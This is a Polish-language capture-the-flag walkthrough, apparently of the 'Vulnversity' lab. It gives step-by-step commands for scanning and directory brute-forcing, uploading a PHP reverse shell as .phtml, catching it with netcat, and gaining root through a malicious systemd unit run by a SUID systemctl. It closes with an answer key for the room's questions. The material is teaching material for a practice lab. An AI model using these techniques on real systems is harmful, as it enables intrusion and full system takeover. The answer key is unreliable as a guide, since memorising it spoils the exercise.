1. Na początku musimy klasycznie połączyć się z VPN za pomocą OpenVPN.
Wchodzimy na nasz profil pobieramy plik do połączanienia wchodzimy w "/Downloads" i wpisujemy w nowym
terminalu:

``` $ openvpn <Nazwa>.ovpn ```


2. Po tym otwieramy zadanie nr. 1 i odpalamy instancję ( Deploy ).


3. Po tym wszystkim możemy powoli zaczynać. Pierwsze co robimy to skanujemy maszyne:

$ nmap -sC -sV -T4 -A <Adress Ip> -oA nmap.nmap

4. Z skanowania da się wydedykować, że na porcie "3333" działa Server Apache. Wpisujemy więc w naszą przeglądarke
AdressIp:3333 i patrzymy co na niej widnieje.

5. Teraz z racji, że szukanie ręcznie ścieżek na stronie może być bardzo monotonne i nie efektywne użyjemy dirb,
dirbuster, wfuzz, gobuster. W zależności w czym wam wygodniej. Ja użyje gobuster'a:

$ gobuster dir -u http://<ip>:3333/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

6. Po chwili znajdziemy ściekę "/internal", więc sprawdzamy co tam jest. ( Ip:3333/internal ). Widzimy, że na stronie
możemy wysyłać pliki do serwera. Pierwsze co sprawdzamy to jakie pliki można dzięki temu wysłać, w większości 
przypadków można ominąć sprawdzenie.

7. Z racji że jestem na systemie "Kali" to użyje PHP shell. Skopiuj reverse-shell do katalogu roboczego:

$ cp /usr/share/webshells/php/php-reverse-shell.php .

8. Musimy teraz zedytować plik na nasz adress Ip i Port. Adress Ip to adress który po wpisaniu "ifconfig" widnieje
obok "tun0" ( Twoje ip w VPN ). Port ustawmy na "hakerski" 4444. ($ip, $port). I zapiszmy plik.
( Ja użyłem edytora "nano", ale można użyć takiego, w którym jest Ci wygodniej np. "vi" )

9. Żeby przechwycić reverse-shella przydałoby się nasłuchiwać port który ustawiliśmy. Użyjemy w tym celu "NetCat":

$ nc -nlvp 4444 (<--port)

10. Możesz zrobić kopie tego pliku na różne ścieżki ".html" ".php" ".php1" ".php2" ".php5" ".phtml". Ja sprawdzałem
próbując wgrać pliki ręcznie, ale ty w tym celu możesz użyć np. "BurpSuite".

11. Po sprawdzeniu na serwer udało sie wysłać plik z rozszerzeniem ".phtml". Więc sprawdzamy gdzie plik się wgrał w 
tym celu do ścieżki dodajemy "/uploads" i widzimy nasz plik reverse.

12. Klikamy w plik na serwerze ( W przeglądarce ) przez co się uruchamia i w terminalu gdzie uruchomiliśmy netcata
widzimy połączenie i możemy zacząć wydawać polecenia.

13. Wpisując np. "id" "whoami" widzimy nasze uprawnienia.

14. W tym momencie musimy zobaczyć do czego mamy uprawnienia wchodząc np. do home:

$ cd /home
$ ls
$ cd bill
$ cat user.txt

15. Wyświtliła nam się pierwsza "flaga" dla user'a.

16. Teraz szukamy plików binarnych SUID. SUID to w skrócie uprawnienia danego użytkowanika do danych plików:

$ find / -user root -perm -4000 -print 2>/dev/null

17. Widzimy teraz pare plików z ustawioną flagą SUID.

18. Teraz musimy zrobić atak o nazwie "Privilege Escalation" do podniesienia naszych uprawnień systemowych. Scanując
flagę SUID znaleźliśmy plik o nazwie "systemctl".

Systemctl to plik binarny, który kontroluje interfejsy użytkowników i est odpowiedzialny np. za uruchamiane usługi
podczas rozruchu. Domyślnie systemctl przeszuka pliki w "/etc/system/systemd" w celu poszukiwania i obsłużenia
jednostek.

19. Na tej maszynie nie możemy tworzyć nowych plików w ścieżkach należących do root'a, ale możemy zmienić zmienne 
środowiskowe w już instniejącym, więc możemy zrobić PrivEsc.

20. Pierwsze co robimy to tworzymy zmienną środowiskową:

$ priv=$(mktemp).service

Teraz musimy stworzyć plik jednostkowy i przypisać go do zmiennej środowiskowej:

$ echo '[Service]
ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
[Install] 
WantedBy=multi-user.target' > $priv


( Nie bój użyć się entera dopóki nie skończy się ' <-- to możemy dalej wpisywać w nowej linijce. )

21. To co przed chwilą zrobiliśmy to prostu utworzenie usługi, która wykona "Basha", a następnie odczyta falge z 
katalogu głównego root'a i zapisze ją w fladze / pliku w katalogu "/opt"

22. Teraz musimy odpalić plik jednostkowy za pomocą "systemctl":

$ /bin/systemctl link $priv

$ /bin/systemctl enable --now $priv

23. Teraz możemy zobaczyć plik flag w katalogu "/opt":

$ cat flag

24. To tyle przed chwilą wykonaliśmy komendę dla użytkownika root.


// Uzupełnienie rubryk 

Zadanie.2

1) 6

2) 3.5.12

3) 400

4) DNS

5) Ubuntu

6) 3333

Zadanie 3.

1) /internal/

Zadanie 4.

1) .php

2) .phtml

3) bill

4) Twoja flaga dla użytkownika (user-www..)

Zadanie 5.

1) /bin/systemctl

2) Twoja flaga dla administratora (root)
